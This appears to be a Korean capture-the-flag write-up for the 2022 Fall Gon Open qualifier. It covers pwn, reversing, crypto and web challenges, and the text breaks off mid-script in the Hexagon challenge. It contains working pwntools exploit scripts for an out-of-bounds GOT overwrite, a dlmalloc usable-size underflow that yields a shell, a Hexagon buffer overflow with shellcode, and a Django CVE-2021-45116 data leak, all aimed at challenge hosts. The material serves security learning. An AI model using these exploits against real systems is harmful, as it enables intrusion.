[{"content":" 2022 Fall Gon Open Qual CTF\nimssm99 (2nd, 11427 pts)\nA. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.\ncnt = 1; for ( i = 0; i \u0026lt; cnt; ++i ) { printf(\u0026#34;(r)ead / (a)dd \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%2s\u0026#34;, \u0026amp;s); if ( (char)s == \u0026#39;a\u0026#39; ) { printf(\u0026#34; idx \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); printf(\u0026#34; value \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%f\u0026#34;, \u0026amp;value); arr[idx] = value + arr[idx]; } else if ( (char)s == \u0026#39;r\u0026#39; ) { printf(\u0026#34; idx \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); printf(\u0026#34;%.10e\\n\u0026#34;, arr[idx]); } memset(\u0026amp;s, 0, 3uLL); } /* .got.plt:0x601028 = memset .got.plt:0x601030 = setvbuf .bss:0x6010A0 = arr .bss:0x6010E0 = cnt */ Exploit 먼저 cnt를 조작하여 for loop가 여러 번 돌도록 한다. arr[-28]을 읽어 setvbuf@got의 lower 4byte를 읽어 system함수의 주소를 알아낸다. arr[-30]에 값을 더해 memset@got를 system함수의 주소로 덮어쓴다. memset(\u0026amp;s, 0, 3uLL)에서 system(\u0026amp;s)가 실행되어 원하는 명령을 입력할 수 있다. from pwn import * import struct itof = lambda x: struct.unpack(\u0026#34;\u0026lt;f\u0026#34;, struct.pack(\u0026#34;\u0026lt;L\u0026#34;, x))[0] ftoi = lambda x: struct.unpack(\u0026#34;\u0026lt;L\u0026#34;, struct.pack(\u0026#34;\u0026lt;f\u0026#34;, x))[0] elf = ELF(\u0026#34;./zero_gravity\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) p = remote(\u0026#34;host1.dreamhack.games\u0026#34;, 20267) #p = process(\u0026#34;./zero_gravity\u0026#34;) def read(idx): p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt; \u0026#34;, b\u0026#34;r\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt; \u0026#34;, str(idx).encode()) return ftoi(float(p.recvline())) def add(idx, value): p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt; \u0026#34;, b\u0026#34;a\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt; \u0026#34;, str(idx).encode()) p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt; \u0026#34;, str(value).encode()) add(16, 0x10) # cnt+=0x10 l = read(-30) lp = itof(l) t = read(-28) - libc.symbols[\u0026#34;setvbuf\u0026#34;] + libc.symbols[\u0026#34;system\u0026#34;] tp = itof(t) print(hex(l), lp) print(hex(t), tp) add(-30, tp-lp) print(hex(read(-30))) p.interactive() B. Bomblab - Hard Level 1 ~ Level 6은 정적 분석을 통해 풀었고, Secret Phase는 Binary Patch를 통해 디버거 탐지를 우회한 뒤 GDB를 이용해 동적으로 분석했다.\nLevel 1 a = bytes.fromhex(\u0026#34;839C8982939F899F8D8189\u0026#34;) code = bytes([x^0xCC for x in a]) print(\u0026#34;[+] level 1:\u0026#34;, code) Level 2 a = [0]*6 a[0] = 1 for i in range(1, 6): a[i] = ( ((i*(i+1)) \u0026gt;\u0026gt; 1) + a[i-1] ) assert a[i] == ( ((i*(i+1)) \u0026gt;\u0026gt; 1) + a[i-1] ) print(\u0026#34;[+] level 2:\u0026#34;, \u0026#34; \u0026#34;.join(map(str, a))) Level 3 a = 0xDEADBEEF assert a \u0026gt; 0xDEADBEEE b = -327871 * ((450357013 * a) \u0026gt;\u0026gt; 53) * 61 + a assert (a - b) // 0x3D == 327871 * ((450357013 * a) \u0026gt;\u0026gt; 53) print(\u0026#34;[+] level 3:\u0026#34;, a, b) Level 4 a, b = 123, 456 assert a \u0026gt;= -1 and b \u0026gt;= 0 assert a**4 - 3*(a**2)*b + b**2 == 208398105 print(\u0026#34;[+] level 4:\u0026#34;, a, b) Level 5 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main(void) { double f; // [rsp+18h] [rbp-48h] BYREF double v3; // [rsp+20h] [rbp-40h] double v4; // [rsp+28h] [rbp-38h] double c; // [rsp+30h] [rbp-30h] double v6; // [rsp+38h] [rbp-28h] double v7; // [rsp+40h] [rbp-20h] double v8; // [rsp+48h] [rbp-18h] double v9; // [rsp+50h] [rbp-10h] c = 0.0000001; v3 = 0.0; v4 = 0.0; f = 0.9; while ( f \u0026gt; v4 ) { v6 = (v3 + 1.0) * (v4 + 1.0); v4 = c / 2.0 + v4; v7 = (v6 * c / 2.0 + v3 + 1.0) * (v4 + 1.0); v8 = (v7 * c / 2.0 + v3 + 1.0) * (v4 + 1.0); v4 = c / 2.0 + v4; v9 = (c * v8 + v3 + 1.0) * (v4 + 1.0); v3 = (v8 + v8 + v7 + v7 + v6 + v9) * c / 6.0 + v3; if ( fabs(v3 - 1.604151184400547) \u0026lt;= c ) { printf(\u0026#34;%.18lf\\n\u0026#34;, v4); break; } } if ( fabs(v3 - 1.604151184400547) \u0026gt; c ) { printf(\u0026#34;boom\\n\u0026#34;); } return 0; } Level 6 result = 1 for i in range(6): result *= func(inp[i], 1, inp[i+6], path) assert result == 229391351 # 229391351 = 7 · 19 · 23 · 31 · 41 · 59 Secret Phase scanf(\u0026amp;level4_input, \u0026#34;%d %d %s\u0026#34;, \u0026amp;a, \u0026amp;b, \u0026amp;c); if (c == \u0026#34;c0m0r1bb\u0026#34;) SecretPhase2(); Secret Phase 2 input = read_stream(); if ( (\u0026amp;abs \u0026amp; 0xFFF) != 3536 || (\u0026amp;atoi \u0026amp; 0xFFF) != 1600 ) boom(); if ( abs(atoi(input)) == 3.14 ) { puts(\u0026#34;Wow! You\u0026#39;ve defused the secret stage!\u0026#34;); puts(\u0026#34;Congratulations! You\u0026#39;ve defused the bomb!\u0026#34;); print_flag(); exit(0); } for ( i = 0; i \u0026lt;= 0x16E; ++i ) *(\u0026amp;retaddr + i) = \u0026amp;abs + qword_203020[i] - 286160; abs(atoi(input))은 절대 3.14가 될 수 없다. 아래 return address에 ROP Payload를 추가하는 부분이 있다. GDB를 이용해 boom()으로 가지 않도록 breakpoint를 걸어가며 확인했다.\n→ 0x7ffff7df12b6 \u0026lt;__vfprintf_internal+518\u0026gt; cmps BYTE PTR ds:[rsi], BYTE PTR es:[rdi] 0x7ffff7df12b7 \u0026lt;__vfprintf_internal+519\u0026gt; ret 이 부분에서 값이 다르면 boom()으로 가게 된다. 플래그의 길이가 크게 길지 않아 여러 번 실행시켜가며 구조를 분석했고, 동일한 값이 나오는 입력을 찾았다.\nSolution OPEN_SESAME 1 2 5 11 21 36 3735928559 15904193 123 456 c0m0r1bb 0.707106799996007784 12 15 2 17 18 21 7 19 23 31 41 59 FLFCDAFAFPENDEEEEODDFDFDCBCBFN C. pprintable 문제의 이름과 코드에서 알 수 있듯이 p, q의 각 byte는 출력 가능한 ASCII 범위 안에 있다. 이를 이용해 p, q의 upper 2bit가 01임을 알 수 있어 알고 있는 bit가 0.5를 넘게 된다.\n또한, p, q를 복구하는 방법을 찾아보니 Gabrielle de Micheli, Nadia Heninger. Recovering cryptographic keys from partial information, by example. 2020 를 찾을 수 있었다. 여기서 나온 방법을 따라 Branch and Prune을 이용해 p, q를 복구할 수 있었다.\nSolution N = 0x12376eadc9b0bd1f13fa9d904f5a1a75bb7ddaaa77ec5b1e8dec4cb7532b662fcc63a0dfa982e1702be449c9b295bf7a0b7c6ba3dc7aaf3856d681601e723aa3bce3e0cd064793a9c6b00eb01d3e3f0fbceddb208cba2598d9d6a35f3cf8623a1389686807fb5f8f53dd0a7f544c02d030f498f7aa315b7547783399bc88cd3e2859b6786b858a35593537ead5a0cc48401a24cefe6ac6997035f6571af098d5d5b24313437fd89d22cce7fa5907d73c219b609eeea9bcffab0f18504e1d2ed5669752e21dd17b57ea5cf6e6efa76cd965e4589539dc087e152fb4d3f1f90edcdcab22b71b326a3e7e0674f8820a24aa3be15756db2e908d434b80419061bf45 e = 0x10001 p_redacted = 0x50b4040146040415a04084000094153182141460200401063040440024200046055600042240040410248014e00410444640240166000001e09141101084025181052000c30004260000406100601226058401613084a0040492001040404620100401344612000215221412811086840005d06001060000008460040025000 p_mask = 0x1250b70401c6444455a8418d2800945d3182dc1c7060a4010630c0c4282c2a0047575e8084aa4207ac592ca034e02e78445640f40366020089e0b9791119940b53818d2842c3082ea70818e0610a601b2e35844169708ca00404931912e04046e01004893e4632c80a1da23c9ab310868d402dd0600307283300cd680c1a25602 q_redacted = 0x80902304402050a7145440048082208004041205b60014000102340106007002a240b0108404005604000190060092010010004504c2104002100140009020270500022101530484551206642004c1424200000202040042210204c4143704000480101004809114629230312040040000600400420520943204412216404 q_mask = 0x1aa0809033046833d9e7945e420480822090ac0c1a35bf00b48a21223c23060070c2a240b0328c4c235e0408819817209a11531101c50cd21a6012309b40c292302f05000221c353a5845f126e65210ec9c24a0001820284004bf1a206c45637b4500680581894d0d1d46bb2b039a2e84d008a604508420d219c32166b2276c04 pt = int.from_bytes(b\u0026#34;flag{this_is_fake_flag_:P}\u0026#34;, byteorder = \u0026#34;big\u0026#34;) ct = 0x97090fc71e4c4c7fe52fb9c5cafde7bae8cf5f911c2755174f3a61515f475c7000d127e23ad99498bd58078abe2890fe40c64067116c66be74ac5422e731905103f4ecc4ae6cf9478580d6fb373744b897caf2b95f01531b626afb46eb88c0f5f419635a27f903ab8ffc55094e015008cbb9520f07755da279226fefa8859bfef694b86ca3fdf88042361d18ecb7ae1ecf98041140b3f167687f45e3da914ee35f9d345782438018310da609578a1047a99a9c54ff846eb2017ac26a0cfb8f5e542c0c7feba904e0ff15a6e2712c2135f9c80b057185cd31a8e9e5371194d063776bdf3537837c705d3761dd6f0ec9419034c294914015bc0e3fbea474fdc15 import string print(bin(p_mask)) mask = (1\u0026lt;\u0026lt;1024) - 1 p_mask \u0026amp;= mask q_mask \u0026amp;= mask pb = bytearray(p_redacted.to_bytes(128, \u0026#34;big\u0026#34;)) pm = bytearray(p_mask.to_bytes(128, \u0026#34;big\u0026#34;)) qb = bytearray(q_redacted.to_bytes(128, \u0026#34;big\u0026#34;)) qm = bytearray(q_mask.to_bytes(128, \u0026#34;big\u0026#34;)) for i in range(128): pb[i] |= 0b01000000 pm[i] |= 0b11000000 qb[i] |= 0b01000000 qm[i] |= 0b11000000 p_known = int.from_bytes(pb, \u0026#34;big\u0026#34;) q_known = int.from_bytes(qb, \u0026#34;big\u0026#34;) p_mask2 = int.from_bytes(pm, \u0026#34;big\u0026#34;) q_mask2 = int.from_bytes(qm, \u0026#34;big\u0026#34;) p_cnt = (bin(p_mask2)[2:].count(\u0026#34;1\u0026#34;), bin(p_mask2)[2:].count(\u0026#34;0\u0026#34;)) q_cnt = (bin(q_mask2)[2:].count(\u0026#34;1\u0026#34;), bin(q_mask2)[2:].count(\u0026#34;0\u0026#34;)) print(\u0026#34;P:\u0026#34;, p_cnt, p_cnt[0]/1024 * 100) print(\u0026#34;Q:\u0026#34;, q_cnt, q_cnt[0]/1024 * 100) assert p_cnt[0]/1024 \u0026gt; 0.5 and q_cnt[0]/1024 \u0026gt; 0.5 pbin = lambda x: bin(x)[2:].rjust(1024, \u0026#34;0\u0026#34;)[::-1] p_k = pbin(p_known) q_k = pbin(q_known) p_m = pbin(p_mask2) q_m = pbin(q_mask2) queue = [(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, 0)] btoi = lambda x: int(x[::-1], 2) while queue: # print(queue) p_t, q_t, i = queue.pop() if i == 1024: p = btoi(p_t) q = btoi(q_t) print(\u0026#34;p:\u0026#34;, p) print(\u0026#34;q:\u0026#34;, q) assert p*q == N print((p.to_bytes(256, \u0026#34;big\u0026#34;) + q.to_bytes(256, \u0026#34;big\u0026#34;)).decode()) break if i != 0 and (btoi(p_t) * btoi(q_t)) % 2**(i) != N % 2**(i): continue if p_m[i] == \u0026#34;1\u0026#34; and q_m[i] == \u0026#34;1\u0026#34;: queue.append((p_t+p_k[i], q_t+q_k[i], i+1)) elif p_m[i] == \u0026#34;1\u0026#34; and q_m[i] == \u0026#34;0\u0026#34;: queue.append((p_t+p_k[i], q_t+\u0026#34;0\u0026#34;, i+1)) queue.append((p_t+p_k[i], q_t+\u0026#34;1\u0026#34;, i+1)) elif p_m[i] == \u0026#34;0\u0026#34; and q_m[i] == \u0026#34;1\u0026#34;: queue.append((p_t+\u0026#34;0\u0026#34;, q_t+q_k[i], i+1)) queue.append((p_t+\u0026#34;1\u0026#34;, q_t+q_k[i], i+1)) else: queue.append((p_t+\u0026#34;0\u0026#34;, q_t+\u0026#34;0\u0026#34;, i+1)) queue.append((p_t+\u0026#34;0\u0026#34;, q_t+\u0026#34;1\u0026#34;, i+1)) queue.append((p_t+\u0026#34;1\u0026#34;, q_t+\u0026#34;0\u0026#34;, i+1)) queue.append((p_t+\u0026#34;1\u0026#34;, q_t+\u0026#34;1\u0026#34;, i+1)) D. Obstacle 동적으로 디버깅하며 label과 .text로의 Indirect call을 이용하여 Control-Flow를 복구할 수 있었고, 이를 통해 encrypt 과정을 python코드로 작성할 수 있었다. 그 과정을 역으로 수행하는 decrypt를 구현하여 flag를 얻을 수 있었다.\nSolution import struct mask8 = 0xFFFFFFFFFFFFFFFF mask4 = 0xFFFFFFFF def ROL(num, count, bits=8): return ((num \u0026lt;\u0026lt; count) | (num \u0026gt;\u0026gt; (bits - count))) \u0026amp; ((0b1\u0026lt;\u0026lt;bits) - 1) def ROR(num, count, bits=8): return ((num \u0026gt;\u0026gt; count) | (num \u0026lt;\u0026lt; (bits - count))) \u0026amp; ((0b1\u0026lt;\u0026lt;bits) - 1) key = b\u0026#34;Sup3r_s4f3_k3y\u0026#34;.ljust(16, b\u0026#34;\\x00\u0026#34;) iv = b\u0026#34;Sup3r_4ws0me_1v\u0026#34;.ljust(16, b\u0026#34;\\x00\u0026#34;) pbox = [None]*0x100 for blk in range(0x100): if blk: q, w = 1, 1 while True: tmp = (w^(2*w)^0x1b) \u0026amp; mask4 if w \u0026amp; 0x80 != 0: w = tmp else: w = (w^(2*w)) \u0026amp; mask4 q = (q ^ (4 * (q^(2*q))) ^ (2*q) ^ (16 * ((4 * (q^(2*q))) ^ q ^ (2*q)))) \u0026amp; mask4 if q \u0026amp; 0x80 != 0: q ^= 9 if blk == w \u0026amp; 0xFF: break q \u0026amp;= 0xFF b = (ROL(q, 3) ^ ROL(q, 2) ^ q ^ 0x63 ^ ROL(q, 1) ^ ROL(q, 4)) \u0026amp; 0xFF else: b = 0x63 pbox[blk] = b assert None not in pbox def encRound1(block): for i in range(16): block[i] ^= key[i] return block def encRound2(block): l = struct.unpack(\u0026#34;\u0026gt;Q\u0026#34;, block[:8])[0] h = struct.unpack(\u0026#34;\u0026gt;Q\u0026#34;, block[8:])[0] l ^= ((h \u0026gt;\u0026gt; 19) \u0026amp; mask8) | ((h \u0026lt;\u0026lt; 13) \u0026amp; mask8) block = struct.pack(\u0026#34;\u0026gt;Q\u0026#34;, h) + struct.pack(\u0026#34;\u0026gt;Q\u0026#34;, l) return block def encRound3(block): a = [13, 0, 11, 14, 9, 12, 7, 10, 5, 8, 3, 6, 1, 4, 15, 2] block = bytearray([block[a[x]] for x in range(16)]) for i in range(16): block[i] = pbox[block[i]] return block def decRound1(block): for i in range(16): block[i] ^= key[i] return block def decRound2(block): l = struct.unpack(\u0026#34;\u0026gt;Q\u0026#34;, block[:8])[0] h = struct.unpack(\u0026#34;\u0026gt;Q\u0026#34;, block[8:])[0] h ^= ((l \u0026gt;\u0026gt; 19) \u0026amp; mask8) | ((l \u0026lt;\u0026lt; 13) \u0026amp; mask8) block = struct.pack(\u0026#34;\u0026gt;Q\u0026#34;, h) + struct.pack(\u0026#34;\u0026gt;Q\u0026#34;, l) return block def decRound3(block): for i in range(16): block[i] = pbox.index(block[i]) a = [13, 0, 11, 14, 9, 12, 7, 10, 5, 8, 3, 6, 1, 4, 15, 2] block = bytearray([block[a.index(x)] for x in range(16)]) return block block = bytearray(b\u0026#34;AAAABBBBCCCCDDDD\u0026#34;) assert decRound1(encRound1(block)) == block assert decRound2(encRound2(block)) == block assert decRound3(encRound3(block)) == block \u0026#39;\u0026#39;\u0026#39; # ENC data = bytearray(b\u0026#34;AAAABBBBCCCCDDDD\\n\u0026#34;.ljust(32, b\u0026#34;\\x00\u0026#34;)) for i in range(0, len(data), 0x10): for j in range(0x10): if i == 0: data[j] ^= iv[j] else: data[i+j] ^= data[i+j-16] for r in range(0x131): if r % 3 == 0: data[i:i+0x10] = encRound1(data[i:i+0x10]) elif r % 3 == 1: data[i:i+0x10] = encRound2(data[i:i+0x10]) elif r % 3 == 2: data[i:i+0x10] = encRound3(data[i:i+0x10]) assert data.hex() == \u0026#34;be8744b98893267c3b90cb939e94aeff759b72058e202a6b84ec426c8f0bd092\u0026#34; \u0026#39;\u0026#39;\u0026#39; # DEC #data = bytearray(bytes.fromhex(\u0026#34;be8744b98893267c3b90cb939e94aeff759b72058e202a6b84ec426c8f0bd092\u0026#34;)) # for test data = bytearray(bytes.fromhex(\u0026#34;483918c5094768c537f60136658101142f7f30d93639b93020d8da002fbd1bcc186192025fe8b247530792b520c6c1a3b83789b93bc54ce30ae5d4f058213d45\u0026#34;)) for i in range(0, len(data), 0x10)[::-1]: for r in range(0x131)[::-1]: if r % 3 == 0: data[i:i+0x10] = decRound1(data[i:i+0x10]) elif r % 3 == 1: data[i:i+0x10] = decRound2(data[i:i+0x10]) elif r % 3 == 2: data[i:i+0x10] = decRound3(data[i:i+0x10]) for j in range(0x10): if i == 0: data[j] ^= iv[j] else: data[i+j] ^= data[i+j-16] print(data.decode()) G. Emerald Tablet Vulnerability Django의 dictsort에 대해 검색해보니 문제의 환경인 Django 4.0에 적용되는 CVE-2021-45116을 찾을 수 있었다. sort key로 indexing이 가능한 취약점이었고, key.hex.{i}를 통해 key의 i번째의 hex값으로 정렬하도록 할 수 있었다.\nuuid4()는 random한 uuid를 생성하는 함수이다. 여러 개의 데이터를 만들고, 정렬하여 flag의 index를 구하면 값을 알 수 있다. 데이터의 수가 많을 수록 정확한 값을 찾을 수 있다.\nExploit import requests from bs4 import BeautifulSoup as bs import uuid #url = \u0026#34;http://localhost:59909\u0026#34; url = \u0026#34;http://host3.dreamhack.games:16320\u0026#34; mag = 4 def upload_many(n): for i in range(n): r = requests.post(f\u0026#34;{url}/upload/\u0026#34;, data={\u0026#34;inscriber\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;data\u0026#34;: \u0026#34;a\u0026#34;}, allow_redirects=False) if r.status_code != 302: print(\u0026#34;ERROR!\u0026#34;) break def flag_idx(sort): r = requests.get(f\u0026#34;{url}/list/\u0026#34;, params={\u0026#34;sort\u0026#34;: sort}) soup = bs(r.text, \u0026#34;html.parser\u0026#34;) elems = soup.select(\u0026#34;tbody \u0026gt; tr\u0026#34;) for i, e in enumerate(elems): if e.select_one(\u0026#34;th\u0026#34;).text == \u0026#34;1\u0026#34;: return i return None \u0026#39;\u0026#39;\u0026#39; RFC-4122 low = uuid.UUID(\u0026#34;00000000-0000-4000-8000-000000000000\u0026#34;) high = uuid.UUID(\u0026#34;FFFFFFFF-FFFF-4FFF-BFFF-FFFFFFFFFFFF\u0026#34;) \u0026#39;\u0026#39;\u0026#39; result = \u0026#34;\u0026#34; print(\u0026#34;[+] Upload Many Start\u0026#34;) upload_many(0x100 * mag) print(\u0026#34;[+] Upload Many Done\u0026#34;) for i in range(32): if i == 12: result += \u0026#34;4\u0026#34; elif i == 16: idx = flag_idx(f\u0026#34;key.hex.{i}\u0026#34;) / mag leak = round(idx/0x40)+8 result += hex(leak)[2:] else: idx = flag_idx(f\u0026#34;key.hex.{i}\u0026#34;) / mag leak = round(idx/0x10) result += hex(leak)[2:] print(i, result) print(uuid.UUID(result)) K. dlmalloc Vulnerability 3. Clear 메뉴에서 memset을 할 때 size에 대한 검증이 없어 OOB가 발생한다.\nvoid *storeClear() { __int64 Store; __int64 Index; __int64 n; Store = readStore(); Index = readIndex(Store); printf(\u0026#34;Size? \u0026#34;); n = readUint64(); return memset((void *)(8 * Index + Store), 0, n); } 2. Write메뉴에서 Index를 읽어 원하는 위치에 값을 쓸 수 있다. 이때, malloc_usable_size(store)를 이용해 index의 범위를 검증하게 되는데 여기서 취약점이 발생하게 된다.\nvoid storeWrite() { __int64 result; __int64 Store; __int64 Index; Store = readStore(); Index = readIndex(Store); printf(\u0026#34;Value? \u0026#34;); result = readUint64(); *(_QWORD *)(Store + 8 * Index) = result; return result; } unsigned __int64 readIndex(void *store) { unsigned __int64 Uint64; size_t n; printf(\u0026#34;Index? \u0026#34;); Uint64 = readUint64(); n = malloc_usable_size(store); if ( Uint64 \u0026gt;\u0026gt; 61 || n \u0026lt;= 8 * Uint64 ) { fwrite(\u0026#34;[ERROR] Out-of-bound index.\\n\u0026#34;, 1uLL, 0x1CuLL, stderr); exit(1); } return Uint64; } #define INUSE_BITS (PINUSE_BIT|CINUSE_BIT) // PINUSE_BIT = 1, CINUSE_BIT = 2 #define is_inuse(p) (((p)-\u0026gt;head \u0026amp; INUSE_BITS) != PINUSE_BIT) #define chunksize(p) ((p)-\u0026gt;head \u0026amp; ~(FLAG_BITS)) #define overhead_for(p) (is_mmapped(p)? MMAP_CHUNK_OVERHEAD : CHUNK_OVERHEAD) #define is_mmapped(p) (((p)-\u0026gt;head \u0026amp; INUSE_BITS) == 0) size_t dlmalloc_usable_size(void* mem) { if (mem != 0) { mchunkptr p = mem2chunk(mem); if (is_inuse(p)) return chunksize(p) - overhead_for(p); } return 0; } malloc_usable_size()는 is_inuse(p) == 1, 즉 FLAG_BITS == 0 or 2일 때, chunksize(p) - overhead_for(p)를 return한다. 이때, chunksize == 0이고 FLAG_BITS == 0이면 0 - 16을 반환하게 되고, unsigned 자료형에서 underflow가 발생하게 된다.\n3. Clear메뉴를 이용해 다음 chunk의 chunksize와 FLAG_BITS를 0으로 만들면 Index의 검증을 우회할 수 있고 OOB Write가 가능하다.\nExploit 1. Allocation메뉴에서 allocation이 실패하게 될 경우 ld 중간에 할당되는 경우가 있었다. (이유는 모르겠음) 이를 통해 ld, libc의 base address를 찾고 _rtld_global._dl_rtld_lock_recursive를 system함수의 주소로, _rtld_global._dl_load_lock을 /bin/sh\\x00으로 변조하고 4. Exit메뉴를 통해 exit()을 호출하여 shell을 획득할 수 있었다.\n561066138000-561066139000 r--p 00000000 08:30 971904 /home/dlmalloc/vuln 561066139000-56106613a000 r-xp 00001000 08:30 971904 /home/dlmalloc/vuln 56106613a000-56106613b000 r--p 00002000 08:30 971904 /home/dlmalloc/vuln 56106613b000-56106613c000 r--p 00002000 08:30 971904 /home/dlmalloc/vuln 56106613c000-56106613d000 rw-p 00003000 08:30 971904 /home/dlmalloc/vuln 7f619dbc1000-7f619dbc4000 rw-p 00000000 00:00 0 7f619dbc4000-7f619dbe6000 r--p 00000000 08:30 961397 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f619dbe6000-7f619dd5e000 r-xp 00022000 08:30 961397 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f619dd5e000-7f619ddac000 r--p 0019a000 08:30 961397 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f619ddac000-7f619ddb0000 r--p 001e7000 08:30 961397 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f619ddb0000-7f619ddb2000 rw-p 001eb000 08:30 961397 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f619ddb2000-7f619ddb6000 rw-p 00000000 00:00 0 7f619ddba000-7f619ddbb000 r--p 00000000 08:30 971857 /home/dlmalloc/libdlmalloc.so 7f619ddbb000-7f619ddc5000 r-xp 00001000 08:30 971857 /home/dlmalloc/libdlmalloc.so 7f619ddc5000-7f619ddc6000 r--p 0000b000 08:30 971857 /home/dlmalloc/libdlmalloc.so 7f619ddc6000-7f619ddc7000 r--p 0000b000 08:30 971857 /home/dlmalloc/libdlmalloc.so 7f619ddc7000-7f619ddc8000 rw-p 0000c000 08:30 971857 /home/dlmalloc/libdlmalloc.so 7f619ddc8000-7f619ddca000 rw-p 00000000 00:00 0 7f619ddca000-7f619ddcb000 r--p 00000000 08:30 961375 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f619ddcb000-7f619ddee000 r-xp 00001000 08:30 961375 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f619ddee000-7f619ddf6000 r--p 00024000 08:30 961375 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f619ddf6000-7f619ddf7000 rw-p 00000000 00:00 0 7f619ddf7000-7f619ddf8000 r--p 0002c000 08:30 961375 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f619ddf8000-7f619ddf9000 rw-p 0002d000 08:30 961375 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f619ddf9000-7f619ddfa000 rw-p 00000000 00:00 0 7ffe5497a000-7ffe5499b000 rw-p 00000000 00:00 0 [stack] 7ffe549a1000-7ffe549a5000 r--p 00000000 00:00 0 [vvar] 7ffe549a5000-7ffe549a6000 r-xp 00000000 00:00 0 [vdso] from pwn import * def falloc(size): p.sendlineafter(b\u0026#34;?\u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;?\u0026#34;, str(size).encode()) r = p.recvline() if b\u0026#34;Failed\u0026#34; in r: return None return int(r.split(b\u0026#34;: \u0026#34;)[1], 16) def fwrite(store, index, data): p.sendlineafter(b\u0026#34;?\u0026#34;, b\u0026#34;2\u0026#34;) p.sendlineafter(b\u0026#34;?\u0026#34;, str(store).encode()) p.sendlineafter(b\u0026#34;?\u0026#34;, str(index).encode()) p.sendlineafter(b\u0026#34;?\u0026#34;, str(data).encode()) def fclear(store, index, size): p.sendlineafter(b\u0026#34;?\u0026#34;, b\u0026#34;3\u0026#34;) p.sendlineafter(b\u0026#34;?\u0026#34;, str(store).encode()) p.sendlineafter(b\u0026#34;?\u0026#34;, str(index).encode()) p.sendlineafter(b\u0026#34;?\u0026#34;, str(size).encode()) #context.log_level = \u0026#34;debug\u0026#34; libc = ELF(\u0026#34;libc.so.6\u0026#34;) #p = process(\u0026#34;./vuln\u0026#34;, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libdlmalloc.so\u0026#34;}) p = remote(\u0026#34;host3.dreamhack.games\u0026#34;, 14260) falloc(0xFFFFFFFF00000000) falloc(0xFFFFFFFF00000000) falloc(0xFFFFFFFF00000000) falloc(0x20) leak = falloc(0x20) ld_bss_offset = 0x2000 libc_base = leak - 0x40 - 0x230000 print(hex(leak - 0x40 + ld_bss_offset)) fclear(0, 0, 1024) pause() fwrite(1, (0x2f68 - 0x40) // 8, libc_base + libc.symbols[\u0026#34;system\u0026#34;]) fwrite(1, (0x2968 - 0x40) // 8, u64(b\u0026#34;/bin/sh\\x00\u0026#34;)) p.sendlineafter(b\u0026#34;?\u0026#34;, b\u0026#34;4\u0026#34;) p.interactive() L. baby-hexagon Vulnerability int main (int argc, char **argv, char **envp); 0x000202a0 ? allocframe(SP,#0x110):raw 0x000202a4 / immext(##0xfffefe80) 0x000202a8 \\ R2 = add(PC,##0xfffefebe) 0x000202ac [ R0 = ##0x40 0x000202b0 [ R1 = ##0x1 0x000202b4 [ R3 = ##0x15 0x000202b8 [ call syscall ; sym.syscall -\u0026gt; write(0x1, \u0026amp;\u0026#34;Give me something...\\n\u0026#34;, 0x15) 0x000202bc [ R1 = ##0x3f 0x000202c0 [ R2 = ##0x0 0x000202c4 [ R3 = add(FP,##-0x100) 0x000202c8 [ R4 = ##0x200 0x000202cc [ memw(FP+##-0x104) = R0 0x000202d0 [ R0 = R1 0x000202d4 [ R1 = R2 0x000202d8 [ memw(FP+##-0x108) = R2 0x000202dc [ R2 = R3 0x000202e0 [ R3 = R4 0x000202e4 [ call syscall ; sym.syscall -\u0026gt; read(0x0, 0x4080xxxx, 0x200) 0x000202e8 [ R1 = memw(FP+##-0x108) 0x000202ec [ memw(FP+##-0x10c) = R0 0x000202f0 [ R0 = R1 0x000202f4 [ LR:FP = dealloc_return(FP):raw Stack frame의 크기보다 큰 입력을 받기 때문에 Buffer Overflow가 발생한다.\nExploit FP를 바꾸고 원하는 주소(r, w)에 입력받은 뒤, 그 주소에 쉘코드를 쓰고 점프했다. 지금 보니까 x 권한이 없는데 아마도 _qemu-hexagon_이 쉘코드를 직접 Host에서 실행하는 것이 아니라 TCG를 이용해 실행하기 때문에 되는 것으로 추정된다.\n00010000-00020000 ---p 00000000 00:00 0 00020000-00040000 r--p 00000000 00:00 0 00040000-00052000 rw-p 00000000 00:00 0 00052000-00060000 rw-p 00000000 00:00 0 00060000-40000000 ---p 00000000 00:00 0 40000000-40010000 r--p 00000000 00:00 0 40010000-40020000 ---p 00000000 00:00 0 40020000-40820000 rw-p 00000000 00:00 0 40820000-100000000 ---p 00000000 00:00 0 from pwn import * import time from keystone import * ks = Ks(KS_ARCH_HEXAGON, KS_MODE_LITTLE_ENDIAN) addr = 0x40600000 # rw? rwx? code = f\u0026#34;\u0026#34;\u0026#34; R6 = ##0xDD R0 = ##{hex(addr + 0x38)} R1 = ##{hex(addr + 0x40)} R2 = ##{hex(addr + 0x50)} \u0026#34;\u0026#34;\u0026#34; encoding, count = ks.asm(code) asmcode = bytearray(encoding) asmcode += bytes.fromhex(\u0026#34;04C00054\u0026#34;) # trap0(#0x1) code = 